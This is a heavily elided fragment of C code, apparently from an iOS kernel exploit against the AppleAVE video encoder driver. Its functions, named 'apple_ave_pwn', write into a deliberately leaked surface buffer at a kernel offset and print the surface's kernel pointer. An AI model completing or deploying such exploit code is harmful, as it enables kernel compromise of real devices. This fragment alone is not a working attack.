...
kern_return_t apple_ave_pwn_put_data_in_bulk(void * address_with_data) {
	...
	*((char*)g_bad_surface_buffer + offsets_get_offsets().encode_frame_offset_keep_cache) = 0;
	...
	if (KERN_SUCCESS != ret)
	{
		//("Error preparing to encode frames...");
		goto cleanup;
	}
...
kern_return_t apple_ave_pwn_init() {
	...
	if (KERN_SUCCESS != ret)
	{
		printf("Error getting kernel pointer for surface %d", g_bad_surface_that_will_never_be_freed);
	}
	else {
		printf("g_bad_surface_that_will_never_be_freed's kernel pointer is %p", g_bad_surface_that_will_never_be_freed_kernel_ptr);
	}
